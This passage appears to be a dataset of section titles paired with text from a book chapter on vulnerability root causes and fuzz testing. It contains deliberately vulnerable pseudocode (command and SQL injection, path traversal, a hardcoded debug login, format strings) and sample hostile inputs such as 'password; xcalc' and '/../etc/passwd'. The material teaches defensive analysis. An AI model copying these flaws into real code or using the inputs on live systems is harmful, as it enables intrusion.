network and inserted into the allocated buffer, the parser uses the orig-\ninal length. Because the original length of the data doesn’t match up to the\nsize of the allocation, values will be written outside of the buffer, causing\nmemory corruption.\nWHAT HAPPENS If WE ALLOCATE ZERO ByTES?\nConsider what happens when we calculate an allocation length of zero bytes .\nWould the allocation simply fail because you can’t allocate a zero-length buf-\nfer? As with many issues in languages like C, it is up to the implementation to\ndetermine what occurs (the dreaded implementation-defined behavior) . In the\ncase of the C allocator function, malloc, passing zero as the requested size can\nreturn a failure, or it can return a buffer of indeterminate size, which hardly\ninstills confidence .\nThe Root Causes of Vulnerabilities 215"
  },
  {
    "input": "Out-of-Bounds Buffer Indexing",
    "output": "Out-of-Bounds Buffer Indexing\nYou’ve already seen that memory-unsafe languages do not perform bounds\nchecks. But sometimes a vulnerability occurs because the size of the buf-\nfer is incorrect, leading to memory corruption. Out-of-bounds indexing\nstems from a different root cause: instead of incorrectly specifying the\nsize of a data value, we’ll have some control over the position in the buffer\nwe’ll access. If incorrect bounds checking is done on the access position,\na vulnerability exists. The vulnerability can in many cases be exploited to\nwrite data outside the buffer, leading to selective memory corruption. Or it\ncan be exploited by reading a value outside the buffer, which could lead to\ninformation disclosure or even remote code execution. Listing 9-4 shows an\nexample that exploits the first case—writing data outside the buffer.\n byte app_flags[32];\ndef update_flag_value()\n{\n byte index = read_byte();\nbyte value = read_byte();\nprintf(\"Writing %d to index %d\\n\", value, index);\n app_flags[index] = value;\n}\nListing 9-4: Writing to an out-of-bound buffer index\nThis short example shows a protocol with a common set of flags that\ncan be updated by the client. Perhaps it’s designed to control certain server\nproperties. The listing defines a fixed buffer of 32 flags at . At  it reads\na byte from the network, which it will use as the index (with a range of 0 to\n255 possible values), and then it writes the byte to the flag buffer . The\nvulnerability in this case should be obvious: an attacker can provide values\noutside the range of 0 to 32 with the index, leading to selective memory\ncorruption.\nOut-of-bounds indexing doesn’t just have to involve writing. It works\njust as well when values are read from a buffer with an incorrect index. If\nthe index were used to read a value and return it to the client, a simple\ninformation disclosure vulnerability would exist.\nA particularly critical vulnerability could occur if the index were used\nto identify functions within an application to run. This usage could be\nsomething simple, such as using a command identifier as the index, which\nwould usually be programmed by storing memory pointers to functions in\na buffer. The index is then used to look up the function used to handle the\nspecified command from the network. Out-of-bounds indexing would result\nin reading an unexpected value from memory that would be interpreted\nas a pointer to a function. This issue can easily result in exploitable remote\n216 Chapter 9"
  },
  {
    "input": "Dynamic Memory Allocation Failures",
    "output": "code execution vulnerabilities. Typically, all that is required is finding an\nindex value that, when read as a function pointer, would cause execution to\ntransfer to a memory location an attacker can easily control.\nData Expansion Attack\nEven modern, high-speed networks compress data to reduce the number\nof raw octets being sent, whether to improve performance by reducing data\ntransfer time or to reduce bandwidth costs. At some point, that data must\nbe decompressed, and if compression is done by an application, data expan-\nsion attacks are possible, as shown in Listing 9-5.\nvoid read_compressed_buffer()\n{\nbyte buf[];\nuint32 len;\nint i = 0;\n// Read the decompressed size\n len = read_uint32();\n// Allocate memory buffer\n buf = malloc(len);\n gzip_decompress_data(buf)\nprintf(\"Decompressed in %d bytes\\n\", len);\n}\nListing 9-5: Example code vulnerable to a data expansion attack\nHere, the compressed data is prefixed with the total size of the decom-\npressed data. The size is read from the network  and is used to allocate the\nrequired buffer . After that, a call is made to decompress the data to the\nbuffer  using a streaming algorithm, such as gzip. The code does not check\nthe decompressed data to see if it will actually fit into the allocated buffer.\nOf course, this attack isn’t limited to compression. Any data transforma-\ntion process, whether it’s encryption, compression, or text encoding conver-\nsions, can change the data size and lead to an expansion attack.\nDynamic Memory Allocation Failures\nA system’s memory is finite, and when the memory pool runs dry, a dynamic\nmemory allocation pool must handle situations in which an application needs\nmore. In the C language, this usually results in an error value being returned\nfrom the allocation functions (usually a NUL pointer); in other languages, it\nmight result in the termination of the environment or the generation of an\nexception.\nSeveral possible vulnerabilities may arise from not correctly handling\na dynamic memory allocation failure. The most obvious is an application\ncrash, which can lead to a denial-of-service condition.\nThe Root Causes of Vulnerabilities 217"
  },
  {
    "input": "User Enumeration",
    "output": "default or hardcoded credentials\nWhen one is deploying an application that uses authentication, default cre-\ndentials are commonly added as part of the installation process. Usually,\nthese accounts have a default username and password associated with them.\nThe defaults create a problem if the administrator deploying the applica-\ntion does not reconfigure the credentials for these accounts prior to mak-\ning the service available.\nA more serious problem occurs when an application has hard-\ncoded credentials that can be changed only by rebuilding the applica-\ntion. These credentials may have been added for debugging purposes\nduring development and not removed before final release. Or they could\nbe an intentional backdoor added with malicious intent. Listing 9-6 shows\nan example of authentication compromised by hardcoded credentials.\ndef process_authentication()\n{\n string username = read_string();\nstring password = read_string();\n// Check for debug user, don't forget to remove this before release\n if(username == \"debug\")\n{\nreturn true;\n}\nelse\n{\n return check_user_password(username, password);\n}\n}\nListing 9-6: An example of default credentials\nThe application first reads the username and password from the net-\nwork  and then checks for a hardcoded username, debug . If the appli-\ncation finds username debug, it automatically passes the authentication\nprocess; otherwise, it follows the normal checking process . To exploit\nsuch a default username, all you’d need to do is log in as the debug user. In\na real-world application, the credentials might not be that simple to use.\nThe login process might require you to have an accepted source IP address,\nsend a magic string to the application prior to login, and so on.\nuser enumeration\nMost user-facing authentication mechanisms use usernames to control access\nto resources. Typically, that username will be combined with a token, such as\na password, to complete authentication. The user identity doesn’t have to be a\nsecret: usernames are often a publicly available email address.\nThere are still some advantages to not allowing someone, especially\nunauthenticated users, to gain access to this information. By identifying\n218 Chapter 9"
  },
  {
    "input": "Incorrect Resource Access",
    "output": "valid user accounts, it is more likely that an attacker could brute force\npasswords. Therefore, any vulnerability that discloses the existence of\nvalid usernames or provides access to the user list is an issue worth iden-\ntifying. A vulnerability that discloses the existence of users is shown in\nListing 9-7.\ndef process_authentication()\n{\nstring username = read_string();\nstring password = read_string();\n if(user_exists(username) == false)\n{\n write_error(\"User \" + username \" doesn't exist\");\n}\nelse\n{\n if(check_user_password(username, password))\n{\nwrite_success(\"User OK\");\n}\nelse\n{\nx write_error(\"User \" + username \" password incorrect\");\n}\n}\n}\nListing 9-7: Disclosing the existence of users in an application\nThe listing shows a simple authentication process where the username\nand password are read from the network. It first checks for the existence of\na user ; if the user doesn’t exist, an error is returned . If the user exists,\nthe listing checks the password for that user . Again, if this fails, an error\nis written x. You’ll notice that the two error messages in  and x are dif-\nferent depending on whether the user does not exist or only the password is\nincorrect. This information is sufficient to determine which usernames are\nvalid.\nBy knowing a username, an attacker can more easily brute force valid\nauthentication credentials. (It’s simpler to guess only a password rather\nthan both a password and username.) Knowing a username can also give\nan attacker enough information to mount a successful social-engineering\nattack that would convince a user to disclose their password or other sensi-\ntive information.\nincorrect resource access\nProtocols that provide access to resources, such as HTTP or other file-shar-\ning protocols, use an identifier for the resource you want to access. That\nidentifier could be a file path or other unique identifier. The application\nThe Root Causes of Vulnerabilities 219"
  },
  {
    "input": "Canonicalization",
    "output": "must resolve that identifier in order to access the target resource. On suc-\ncess, the contents of the resource are accessed; otherwise, the protocol\nthrows an error.\nSeveral vulnerabilities can affect such protocols when they’re process-\ning resource identifiers. It’s worth testing for all possible vulnerabilities and\ncarefully observing the response from the application.\nCanonicalization\nIf the resource identifier is a hierarchical list of resources and directories,\nit’s normally referred to as a path. Operating systems typically define the\nway to specify relative path information is to use two dots (..) to indicate a\nparent directory relationship. Before a file can be accessed, the OS must\nfind it using this relative path information. A very naive remote file proto-\ncol could take a path supplied by a remote user, concatenate it with a base\ndirectory, and pass that directly to the OS, as shown in Listing 9-8. This is\nknown as a canonicalization vulnerability.\ndef send_file_to_client()\n{\n string name = read_string();\n// Concatenate name from client with base path\n string fullPath = \"/files\" + name;\n int fd = open(fullPath, READONLY);\n// Read file to memory\nx byte data[] read_to_end(fd);\n// Send to client\ny write_bytes(data, len(data));\n}\nListing 9-8: A path canonicalization vulnerability\nThis listing reads a string from the network that represents the name of\nthe file to access . This string is then concatenated with a fixed base path\ninto the full path  to allow access only to a limited area of the filesystem.\nThe file is then opened by the operating system , and if the path contains\nrelative components, they are resolved. Finally, the file is read into memory x\nand returned to the client y.\nIf you find code that performs this same sequence of operations, you’ve\nidentified a canonicalization vulnerability. An attacker could send a relative\npath that is resolved by the OS to a file outside the base directory, resulting\nin sensitive files being disclosed, as shown in Figure 9-4.\nEven if an application does some checking on the path before sending\nit to the OS, the application must correctly match how the OS will inter-\npret the string. For example, on Microsoft Windows backslashes (\\) and\nforward slashes (/) are acceptable as path separators. If an application\nchecks only backslashes, the standard for Windows, there might still be a\nvulnerability.\n220 Chapter 9"
  },
  {
    "input": "Verbose Errors",
    "output": "Normal operation\nProtocol data\n/files /passwd\nConcatenate\n/files/passwd\nCanonicalize\n/files/passwd\nVulnerable operation\nProtocol data\n/files /../etc/passwd\nConcatenate\n/files/../etc/passwd\nCanonicalize\n/etc/passwd\nFigure 9-4: A normal path canonicalization operation versus\na vulnerable one\nAlthough having the ability to download files from a system might be\nenough to compromise it, a more serious issue results if the canonicaliza-\ntion vulnerability occurs in file upload protocols. If you can upload files to\nthe application-hosting system and specify an arbitrary path, it’s much eas-\nier to compromise a system. You could, for example, upload scripts or other\nexecutable content to the system and get the system to execute that content,\nleading to remote code execution.\nVerbose Errors\nIf, when an application attempts to retrieve a resource, the resource is not\nfound, applications typically return some error information. That error\ncan be as simple as an error code or a full description of what doesn’t exist;\nhowever, it should not disclose any more information than required. Of\ncourse, that’s not always the case.\nIf an application returns an error message when requesting a resource\nthat doesn’t exist and inserts local information about the resource being\nThe Root Causes of Vulnerabilities 221"
  },
  {
    "input": "Memory Exhaustion Attacks",
    "output": "accessed into the error, a simple vulnerability is present. If a file was being\naccessed, the error might contain the local path to the file that was passed\nto the OS: this information might prove useful for someone trying to get\nfurther access to the hosting system, as shown in Listing 9-9.\ndef send_file_to_client_with_error()\n{\n string name = read_string();\n// Concatenate name from client with base path\n string fullPath = \"/files\" + name;\n if(!exist(fullPath))\n{\nx write_error(\"File \" + fullPath + \" doesn't exist\");\n}\nelse\n{\ny write_file_to_client(fullPath);\n}\n}\nListing 9-9: An error message information disclosure\nThis listing shows a simple example of an error message being returned\nto a client when a requested file doesn’t exist. At  it reads a string from\nthe network that represents the name of the file to access. This string is\nthen concatenated with a fixed base path into the full path at . The exis-\ntence of the file is checked with the operating system at . If the file doesn’t\nexist, the full path to the file is added to an error string and returned to the\nclient x; otherwise, the data is returned y.\nThe listing is vulnerable to disclosing the location of the base path\non the local filesystem. Furthermore, the path could be used with other\nvulnerabilities to get more access to the system. It could also disclose the\ncurrent user running the application if, for example, the resource directory\nwas in the user’s home directory.\nMemory exhaustion attacks\nThe resources of the system on which an application runs are finite: avail-\nable disk space, memory, and processing power have limits. Once a critical\nsystem resource is exhausted, the system might start failing in unexpected\nways, such as by no longer responding to new network connections.\nWhen dynamic memory is used to process a protocol, the risk of over-\nallocating memory or forgetting to free the allocated blocks always exists,\nresulting in memory exhaustion. The simplest way in which a protocol can be\nsusceptible to a memory exhaustion vulnerability is if it allocates memory\ndynamically based on an absolute value transmitted in the protocol. For\nexample, consider Listing 9-10.\n222 Chapter 9"
  },
  {
    "input": "Storage Exhaustion Attacks",
    "output": "def read_buffer()\n{\nbyte buf[];\nuint32 len;\nint i = 0;\n// Read the number of bytes from the network\n len = read_uint32();\n// Allocate memory buffer\n buf = malloc(len);\n// Allocate bytes from network\n read_bytes(buf, len);\nprintf(\"Read in %d bytes\\n\", len);\n}\nListing 9-10: A memory exhaustion attack\nThis listing reads a variable-length buffer from the protocol. First, it\nreads in the length in bytes  as an unsigned 32-bit integer. Next, it tries\nto allocate a buffer of that length, prior to reading it from the network .\nFinally, it reads the data from the network . The problem is that an\nattacker could easily specify a very large length, say 2 gigabytes, which\nwhen allocated would block out a large region of memory that no other\npart of the application could access. The attacker could then slowly send\ndata to the server (to try to prevent the connection from closing due to a\ntimeout) and, by repeating this multiple times, eventually starve the system\nof memory.\nMost systems would not allocate physical memory until it was used,\nthereby limiting the general impact on the system as a whole. However,\nthis attack would be more serious on dedicated embedded systems where\nmemory is at a premium and virtual memory is nonexistent.\nstorage exhaustion attacks\nStorage exhaustion attacks are less likely to occur with today’s multi-terabyte\nhard disks but can still be a problem for more compact embedded systems or\ndevices without storage. If an attacker can exhaust a system’s storage capacity,\nthe application or others on that system could begin failing. Such an attack\nmight even prevent the system from rebooting. For example, if an operating\nsystem needs to write certain files to disk before starting but can’t, a perma-\nnent denial-of-service condition can occur.\nThe most common cause of this type of vulnerability is in the logging\nof operating information to disk. For example, if logging is very verbose,\ngenerating a few hundred kilobytes of data per connection, and the maxi-\nmum log size has no restrictions, it would be fairly simple to flood storage\nby making repeated connections to a service. Such an attack might be\nThe Root Causes of Vulnerabilities 223"
  },
  {
    "input": "Algorithmic Complexity",
    "output": "particularly effective if an application logs data sent to it remotely and sup-\nports compressed data. In such a case, an attacker could spend very little\nnetwork bandwidth to cause a large amount of data to be logged.\ncpu exhaustion attacks\nEven though today’s average smartphone has multiple CPUs at its disposal,\nCPUs can do only a certain number of tasks at one time. It is possible\nto cause a denial-of-service condition if an attacker can consume CPU\nresources with a minimal amount of effort and bandwidth. Although this\ncan be done in several ways, I’ll discuss only two: exploiting algorithmic\ncomplexity and identifying external controllable parameters to crypto-\ngraphic systems.\nAlgorithmic Complexity\nAll computer algorithms have an associated computational cost that repre-\nsents how much work needs to be performed for a particular input to get\nthe desired output. The more work an algorithm requires, the more time it\nneeds from the system’s processor. In an ideal world, an algorithm should\ntake a constant amount of time, no matter what input it receives. But that is\nrarely the case.\nSome algorithms become particularly expensive as the number of input\nparameters increases. For example, consider the sorting algorithm Bubble\nSort. This algorithm inspects each value pair in a buffer and swaps them\nif the left value of the pair is greater than the right. This has the effect of\nbubbling the higher values to the end of the buffer until the entire buffer is\nsorted. Listing 9-11 shows a simple implementation.\ndef bubble_sort(int[] buf)\n{\ndo\n{\nbool swapped = false;\nint N = len(buf);\nfor(int i = 1; i < N - 1; ++i)\n{\nif(buf[i-1] > buf[i])\n{\n// Swap values\nswap( buf[i-1], buf[i] );\nswapped = true;\n}\n}\n} while(swapped == false);\n}\nListing 9-11: A simple Bubble Sort implementation\n224 Chapter 9\nThe amount of work this algorithm requires is proportional to the num-\nber of elements (let’s call the number N) in the buffer you need to sort. In\nthe best case, this necessitates a single pass through the buffer, requiring N\niterations, which occurs when all elements are already sorted. In the worst\ncase, when the buffer is sorted in reverse, the algorithm needs to repeat the\nsort process N 2 times. If an attacker could specify a large number of reverse-\nsorted values, the computational cost of doing this sort becomes significant.\nAs a result, the sort could consume 100 percent of a CPU’s processing time\nand lead to denial-of-service.\nIn a real-world example of this, it was discovered that some program-\nming environments, including PHP and Java, used an algorithm for the\nhash table implementations that took N 2 operations in the worst case. A\nhash table is a data structure that holds values keyed to another value, such\nas a textual name. The keys are first hashed using a simple algorithm, which\nthen determines a bucket into which the value is placed. The N 2 algorithm is\nused when inserting the new value into the bucket; ideally, there should be\nfew collisions between the hash values of keys so the size of the bucket is\nsmall. But by crafting a set of keys with the same hash (but, crucially, differ-\nent key values), an attacker could cause a denial-of-service condition on a\nnetwork service (such as a web server) by sending only a few requests.\nBIG-O NOTATION\nBig-O notation, a common representation of computational complexity, repre-\nsents the upper bound for an algorithm’s complexity . Table 9-1 lists some com-\nmon Big-O notations for various algorithms, from least to most complex .\nTable 9-1: Big-O Notation for Worst-Case Algorithm Complexity\nNotation Description\nO(1) Constant time; the algorithm always takes the same amount\nof time .\nO(log N) Logarithmic; the worst case is proportional to the logarithm of\nthe number of inputs .\nO(N) Linear time; the worst case is proportional to the number of\ninputs .\nO(N 2) Quadratic; the worst case is proportional to the square of the\nnumber of inputs .\nO(2N) Exponential; the worst case is proportional to 2 raised to the\npower N .\nBear in mind that these are worst-case values that don’t necessarily repre-\nsent real-world complexity . That said, with knowledge of a specific algorithm,\nsuch as the Bubble Sort, there is a good chance that an attacker could inten-\ntionally trigger the worst case .\nThe Root Causes of Vulnerabilities 225"
  },
  {
    "input": "Configurable Cryptography",
    "output": "Configurable Cryptography\nCryptographic primitives processing, such as hashing algorithms, can also\ncreate a significant amount of computational workload, especially when deal-\ning with authentication credentials. The rule in computer security is that\npasswords should always be hashed using a cryptographic digest algorithm\nbefore they are stored. This converts the password into a hash value, which\nis virtually impossible to reverse into the original password. Even if the hash\nwas disclosed, it would be difficult to get the original password. But someone\ncould still guess the password and generate the hash. If the guessed password\nmatches when hashed, then they’ve discovered the original password. To\nmitigate this problem, it’s typical to run the hashing operation multiple times\nto increase an attacker’s computational requirement. Unfortunately, this pro-\ncess also increases computational cost for the application, which might be a\nproblem when it comes to a denial-of-service condition.\nA vulnerability can occur if either the hashing algorithm takes an expo-\nnential amount of time (based on the size of the input) or the algorithm’s\nnumber of iterations can be specified externally. The relationship between\nthe time required by most cryptographic algorithms and a given input is\nfairly linear. However, if you can specify the algorithm’s number of itera-\ntions without any sensible upper bound, processing could take as long as the\nattacker desired. Such a vulnerable application is shown in Listing 9-12.\ndef process_authentication()\n{\n string username = read_string();\nstring password = read_string();\n int iterations = read_int();\nfor(int i = 0; i < interations; ++i)\n{\n password = hash_password(password);\n}\nx return check_user_password(username, password);\n}\nListing 9-12: Checking a vulnerable authentication\nFirst, the username and password are read from the network . Next,\nthe hashing algorithm’s number of iterations is read , and the hashing\nprocess is applied that number of times . Finally, the hashed password is\nchecked against one stored by the application x. Clearly, an attacker could\nsupply a very large value for the iteration count that would likely consume a\nsignificant amount of CPU resources for an extended period of time, espe-\ncially if the hashing algorithm is computationally complex.\nA good example of a cryptographic algorithm that a client can config-\nure is the handling of public/private keys. Algorithms such as RSA rely on\nthe computational cost of factoring a large public key value. The larger the\nkey value, the more time it takes to perform encryption/decryption and the\nlonger it takes to generate a new key pair.\n226 Chapter 9"
  },
  {
    "input": "Format String Vulnerabilities",
    "output": "Format string vulnerabilities\nMost programming languages have a mechanism to convert arbitrary data\ninto a string, and it’s common to define some formatting mechanism to\nspecify how the developer wants the output. Some of these mechanisms are\nquite powerful and privileged, especially in memory-unsafe languages.\nA format string vulnerability occurs when the attacker can supply a string\nvalue to an application that is then used directly as the format string. The\nbest-known, and probably the most dangerous, formatter is used by the C\nlanguage’s printf and its variants, such as sprintf, which print to a string.\nThe printf function takes a format string as its first argument and then a list\nof the values to format. Listing 9-13 shows such a vulnerable application.\ndef process_authentication()\n{\nstring username = read_string();\nstring password = read_string();\n// Print username and password to terminal\nprintf(username);\nprintf(password);\nreturn check_user_password(username, password))\n}\nListing 9-13: The printf format string vulnerability\nThe format string for printf specifies the position and type of data\nusing a %? syntax where the question mark is replaced by an alphanumeric\ncharacter. The format specifier can also include formatting information,\nsuch as the number of decimal places in a number. An attacker who can\ndirectly control the format string could corrupt memory or disclose infor-\nmation about the current stack that might prove useful for further attacks.\nTable 9-2 shows a list of common printf format specifiers that an attacker\ncould abuse.\nTable 9-2: List of Commonly Exploitable printf Format Specifiers\nFormat Description Potential vulnerabilities\nspecifier\n%d, %p, %u, %x Prints integers Can be used to disclose information\nfrom the stack if returned to an attacker\n%s Prints a zero terminated Can be used to disclose information\nstring from the stack if returned to an attacker\nor cause invalid memory accesses to\noccur, leading to denial-of-service\n%n Writes the current number Can be used to cause selective memory\nof printed characters to corruption or application crashes\na pointer specified in the\narguments\nThe Root Causes of Vulnerabilities 227"
  },
  {
    "input": "SQL Injection",
    "output": "command injection\nMost OSes, especially Unix-based OSes, include a rich set of utilities\ndesigned for various tasks. Sometimes developers decide that the easiest\nway to execute a particular task, say password updating, is to execute an\nexternal application or operating system utility. Although this might not be\na problem if the command line executed is entirely specified by the devel-\noper, often some data from the network client is inserted into the command\nline to perform the desired operation. Listing 9-14 shows such a vulnerable\napplication.\ndef update_password(string username)\n{\n string oldpassword = read_string();\nstring newpassword = read_string();\nif(check_user_password(username, oldpassword))\n{\n// Invoke update_password command\n system(\"/sbin/update_password -u \" + username + \" -p \" + newpassword);\n}\n}\nListing 9-14: A password update vulnerable to command injection\nThe listing updates the current user’s password as long as the origi-\nnal password is known . It then builds a command line and invokes\nthe Unix-style system function . Although we don’t control the username\nor oldpassword parameters (they must be correct for the system call to be\nmade), we do have complete control over newpassword. Because no sanitiza-\ntion is done, the code in the listing is vulnerable to command injection\nbecause the system function uses the current Unix shell to execute the\ncommand line. For example, we could specify a value for newpassword such\nas password; xcalc, which would first execute the password update com-\nmand. Then the shell could execute xcalc as it treats the semicolon as a\nseparator in a list of commands to execute.\nsQl injection\nEven the simplest application might need to persistently store and retrieve\ndata. Applications can do this in a number of ways, but one of the most\ncommon is to use a relational database. Databases offer many advantages,\nnot least of which is the ability to issue queries against the data to perform\ncomplex grouping and analysis.\nThe de facto standard for defining queries to relational databases is the\nStructured Query Language (SQL). This text-based language defines what data\ntables to read and how to filter that data to get the results the application\nwants. When using a text-based language there is a temptation is to build\nqueries using string operations. However, this can easily result in a vulner-\nability like command injection: instead of inserting untrusted data into a\n228 Chapter 9"
  },
  {
    "input": "Text-Encoding Character Replacement",
    "output": "command line without appropriately escaping, the attacker inserts data into\na SQL query, which is executed on the database. This technique can modify\nthe operation of the query to return known results. For example, what if the\nquery extracted the current password for the authenticating user, as shown in\nListing 9-15?\ndef process_authentication()\n{\n string username = read_string();\nstring password = read_string();\n string sql = \"SELECT password FROM user_table WHERE user = '\" + username \"'\";\n return run_query(sql) == password;\n}\nListing 9-15: An example of authentication vulnerable to SQL injection\nThis listing reads the username and password from the network .\nThen it builds a new SQL query as a string, using a SELECT statement to\nextract the password associated with the user from the user table .\nFinally, it executes that query on the database and checks that the pass-\nword read from the network matches the one in the database .\nThe vulnerability in this listing is easy to exploit. In SQL, the strings\nneed to be enclosed in single quotes to prevent them from being inter-\npreted as commands in the SQL statement. If a username is sent in the\nprotocol with an embedded single quote, an attacker could terminate the\nquoted string early. This would lead to an injection of new commands into\nthe SQL query. For example, a UNION SELECT statement would allow the query\nto return an arbitrary password value. An attacker could use the SQL injec-\ntion to bypass the authentication of an application.\nSQL injection attacks can even result in remote code execution. For\nexample, although disabled by default, Microsoft’s SQL Server’s database\nfunction xp_cmdshell allows you to execute OS commands. Oracle’s database\neven allows uploading arbitrary Java code. And of course, it’s also possible\nto find applications that pass raw SQL queries over the network. Even if a\nprotocol is not intended for controlling the database, there’s still a good\nchance that it can be exploited to access the underlying database engine.\ntext-encoding character replacement\nIn an ideal world, everyone would be able to use one type of text encoding\nfor all different languages. But we don’t live in an ideal world, and we use\nmultiple text encodings as discussed in Chapter 3, such as ASCII and vari-\nants of Unicode.\nSome conversions between text encodings cannot be round-tripped:\nconverting from one encoding to another loses important information such\nthat if the reverse process is applied, the original text can’t be restored. This\nThe Root Causes of Vulnerabilities 229\nis especially problematic when converting from a wide character set such as\nUnicode to a narrow one such as ASCII. It’s simply impossible to encode the\nentire Unicode character set in 7 bits.\nText-encoding conversions manage this problem in one of two ways.\nThe simplest approach replaces the character that cannot be represented\nwith a placeholder, such as the question mark (?) character. This might be\na problem if the data value refers to something where the question mark is\nused as a delimiter or as a special character, for example, as in URL parsing\nwhere it represents the beginning of a query string.\nThe other approach is to apply a best-fit mapping. This is used for\ncharacters for which there is a similar character in the new encoding. For\nexample, the quotation mark characters in Unicode have left-facing and\nright-facing forms that are mapped to specific code points, such as U+201C\nand U+201D for left and right double quotation marks. These are outside\nthe ASCII range, but in a conversion to ASCII, they’re commonly replaced\nwith the equivalent character, such as U+0022 or the quotation mark. Best-\nfit mapping can become a problem when the converted text is processed by\nthe application. Although slightly corrupted text won’t usually cause much\nof a problem for a user, the automatic conversion process could cause the\napplication to mishandle the data.\nThe important implementation issue is that the application first veri-\nfies the security condition using one encoded form of a string. Then it uses\nthe other encoded form of a string for a specific action, such as reading a\nresource or executing a command, as shown in Listing 9-16.\ndef add_user()\n{\n string username = read_unicode_string();\n// Ensure username doesn't contain any single quotes\n if(username.contains(\"'\") == false)\n{\n// Add user, need to convert to ASCII for the shell\n system(\"/sbin/add_user '\" + username.toascii() + \"'\");\n}\n}\nListing 9-16: A text conversion vulnerability\nIn this listing, the application reads in a Unicode string representing a\nuser to add to the system . It will pass the value to the add_user command,\nbut it wants to avoid a command injection vulnerability; therefore, it first\nensures that the username doesn’t contain any single quote characters that\ncould be misinterpreted . Once satisfied that the string is okay, it converts\nit to ASCII (Unix systems typically work on a narrow character set, although\nmany support UTF-8) and ensures that the value is enclosed with single\nquotes to prevent spaces from being misinterpreted .\n230 Chapter 9"
  },
  {
    "input": "Summary",
    "output": "Of course, if the best-fit mapping rules convert other characters back\nto a single quote, it would be possible to prematurely terminate the quoted\nstring and return to the same sort of command injection vulnerabilities dis-\ncussed earlier.\nFinal words\nThis chapter showed you that many possible root causes exist for vulner-\nabilities, with a seemingly limitless number of variants in the wild. Even if\nsomething doesn’t immediately look vulnerable, persist. Vulnerabilities can\nappear in the most surprising places.\nI’ve covered vulnerabilities ranging from memory corruptions, caus-\ning an application to behave in a different manner than it was originally\ndesigned, to preventing legitimate users from accessing the services pro-\nvided. It can be a complex process to identify all these different issues.\nAs a protocol analyzer, you have a number of possible angles. It is also\nvital that you change your strategy when looking for implementation vulner-\nabilities. Take into account whether the application is written in memory-safe\nor unsafe languages, keeping in mind that you are less likely to find memory\ncorruption in, for example, a Java application.\nThe Root Causes of Vulnerabilities 231"
  },
  {
    "input": "Chapter 10: \rFinding and Exploiting Security Vulnerabilities",
    "output": "10\nfINDING AND E xPLOITING\nSECuRIT y v uLNER ABILITIES\nParsing the structure of a complex network proto-\ncol can be tricky, especially if the protocol parser is\nwritten in a memory-unsafe programming language,\nsuch as C/C++. Any mistake could lead to a serious\nvulnerability, and the complexity of the protocol\nmakes it difficult to analyze for such vulnerabilities.\nCapturing all the possible interactions between the\nincoming protocol data and the application code that\nprocesses it can be an impossible task.\nThis chapter explores some of the ways you can identify security vul-\nnerabilities in a protocol by manipulating the network traffic going to and\nfrom an application. I’ll cover techniques such as fuzz testing and debug-\nging that allow you to automate the process of discovering security issues."
  },
  {
    "input": "The Simplest Fuzz Test",
    "output": "I’ll also put together a quick-start guide on triaging crashes to determine\ntheir root cause and their exploitability. Finally, I’ll discuss the exploitation\nof common security vulnerabilities, what modern platforms do to mitigate\nexploitation, and ways you can bypass these exploit mitigations.\nFuzz testing\nAny software developer knows that testing the code is essential to ensure\nthat the software behaves correctly. Testing is especially important when\nit comes to security. Vulnerabilities exist where a software application’s\nbehavior differs from its original intent. In theory, a good set of tests\nensures that this doesn’t happen. However, when working with network\nprotocols, it’s likely you won’t have access to any of the application’s tests,\nespecially in proprietary applications. Fortunately, you can create your\nown tests.\nFuzz testing, commonly referred to as fuzzing, is a technique that feeds\nrandom, and sometimes not-so-random, data into a network protocol to force\nthe processing application to crash in order to identify vulnerabilities. This\ntechnique tends to yield results no matter the complexity of the network.\nFuzz testing involves producing multiple test cases, essentially modified\nnetwork protocol structures, which are then sent to an application for pro-\ncessing. These test cases can be generated automatically using random modi-\nfications or under direction from the analyst.\nThe Simplest Fuzz Test\nDeveloping a set of fuzz tests for a particular protocol is not necessarily a\ncomplex task. At its simplest, a fuzz test can just send random garbage to\nthe network endpoint and see what happens.\nFor this example, we’ll use a Unix-style system and the Netcat tool.\nExecute the following on a shell to yield a simple fuzzer:\n$ cat /dev/urandom | nc hostname port\nThis one-line shell command reads data from the system’s random\nnumber generator device using the cat command. The resulting random\ndata is piped into netcat, which opens a connection to a specified endpoint\nas instructed.\nThis simple fuzzer will likely only yield a crash on simple protocols with\nfew requirements. It’s unlikely that simple random generation would create\ndata that meets the requirements of a more complex protocol, such as valid\nchecksums or magic values. That said, you’d be surprised how often a simple\nfuzz test can give you valuable results; because it’s so quick to do, you might\nas well try it. Just don’t use this fuzzer on a live industrial control system man-\naging a nuclear reactor!\n234 Chapter 10"
  },
  {
    "input": "Generating Test Cases",
    "output": "Mutation Fuzzer\nOften, you’ll need to be more selective about what data you send to a net-\nwork connection to get the most useful information. The simplest tech-\nnique in this case is to use existing protocol data, mutate it in some way,\nand then send it to the receiving application. This mutation fuzzer can\nwork surprisingly well.\nLet’s start with the simplest possible mutation fuzzer: a random bit\nflipper. Listing 10-1 shows a basic implementation of this type of fuzzer.\nvoid SimpleFuzzer(const char* data, size_t length) {\nsize_t position = RandomInt(length);\nsize_t bit = RandomInt(8);\nchar* copy = CopyData(data, length);\ncopy[position] ^= (1 << bit);\nSendData(copy, length);\n}\nListing 10-1: A simple random bit flipper mutation fuzzer\nThe SimpleFuzzer() function takes in the data to fuzz and the length of\nthe data, and then generates a random number between 0 and the length\nof the data as the byte of the data to modify. Next, it decides which bit\nin that byte to change by generating a number between 0 and 7. Then it\ntoggles the bit using the XOR operation and sends the mutated data to its\nnetwork destination.\nThis function works when, by random chance, the fuzzer modifies a\nfield in the protocol that is then used incorrectly by the application. For\nexample, your fuzzer might modify a length field set to 0x40 by convert-\ning it to a length field of 0x80000040. This modification might result in an\ninteger overflow if the application multiplies it by 4 (for an array of 32-bit\nvalues, for example). This modification could also cause the data to be mal-\nformed, which would confuse the parsing code and introduce other types\nof vulnerabilities, such as an invalid command identifier that results in the\nparser accessing an incorrect location in memory.\nYou could mutate more than a single bit in the data at a time. However,\nby mutating single bits, you’re more likely to localize the effect of the muta-\ntion to a similar area of the application’s code. Changing an entire byte could\nresult in many different effects, especially if the value is used for a set of flags.\nYou’ll also need to recalculate any checksums or critical fields, such as\ntotal length values after the data has been fuzzed. Otherwise, the resulting\nparsing of the data might fail inside a verification step before it ever gets to\nthe area of the application code that processes the mutated value.\nGenerating Test Cases\nWhen performing more complex fuzzing, you’ll need to be smarter with your\nmodifications and understand the protocol to target specific data types. The\nmore data that passes into an application for parsing, the more complex the\nFinding and Exploiting Security Vulnerabilities 235"
  },
  {
    "input": "Debugging Applications",
